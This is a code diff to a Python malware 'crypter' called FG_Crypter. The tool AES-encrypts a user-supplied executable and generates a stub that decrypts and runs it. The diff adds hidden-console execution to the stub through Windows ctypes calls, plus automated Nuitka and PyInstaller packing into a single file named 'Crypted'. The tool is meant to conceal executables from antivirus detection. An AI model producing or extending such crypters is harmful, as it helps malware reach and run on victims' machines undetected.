@@ -4,7 +4,7 @@ import stat
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from colorama import Fore, Style
-import subprocess
+import random
 
 
 def generate_random_key(key_size):
@@ -43,9 +43,13 @@ def stub(output_file):
         binary_data = f.read()
 
     with open('stub.py', 'w') as python_file:
-        python_file.write(f"""from Crypto.Cipher import AES
+        python_file.write(f"""import ctypes
+h_console = ctypes.windll.kernel32.GetConsoleWindow()
+ctypes.windll.user32.ShowWindow(h_console, 0)
+from Crypto.Cipher import AES
 import subprocess
 import os
+import sys
 
 # Get key and IV from user input
 key = '{key.hex()}'
@@ -70,10 +74,9 @@ with open(file_path, 'rb') as f_in, open(ofile_path, 'wb') as f_out:
         decrypted_chunk = cipher.decrypt(encrypted_chunk)
         f_out.write(decrypted_chunk)
 
-subprocess.run(ofile_path, shell=True)
+subprocess.run(ofile_path,shell=True)
+sys.exit()
 """)
-        print(Fore.BLUE + 'ur good to go ur crypter is '
-                        'ready!!' + Style.RESET_ALL)
 
 
 def decrypt_file(input_file, output_file):
@@ -114,23 +117,35 @@ def display_menu():
 
 # Example usage
 while True:
+    os.system('cls')
     display_menu()
     choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL)
 
     if choice == "1":
+        os.system('cls')
         input_file = input(Fore.YELLOW + "Enter the path of the input file: " + Style.RESET_ALL)
         output_file = input(Fore.YELLOW + "Enter the path of the output file: " + Style.RESET_ALL)
+        os.system('cls')
         encrypt_file(input_file, output_file)
         set_execution_permissions(output_file)
         stub(output_file)
+        print(Fore.LIGHTGREEN_EX+"Creating nuitka compilation")
+        os.system(f'nuitka --mingw64 --onefile --assume-yes-for-downloads --remove-output --include-data-file="{output_file}.exe=." --output-filename=Crypted "stub.py"')
+        print(Fore.LIGHTGREEN_EX+"Creating pyinstaller compilation")
+        os.system(f'pyinstaller --onefile stub.py --add-data "{output_file}.exe;." --name "py-crypted"')
+        os.remove('stub.py')
+        print(Style.RESET_ALL)
+        input(Fore.LIGHTMAGENTA_EX + 'Your crypted exe is ready[Press Enter to continue]'+ Style.RESET_ALL)
     elif choice == "2":
+        os.system('cls')
         input_file = input(Fore.YELLOW + "Enter the path of the input file: " + Style.RESET_ALL)
         output_file = input(Fore.YELLOW + "Enter the path of the output file: " + Style.RESET_ALL)
         decrypt_file(input_file, output_file)
         set_execution_permissions(output_file)
     elif choice == "3":
+        os.system('cls')
         print(Fore.RED + "Cleaning up FG_Crypter" + Style.RESET_ALL)
         break
     else:
+        os.system('cls')
         print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
-
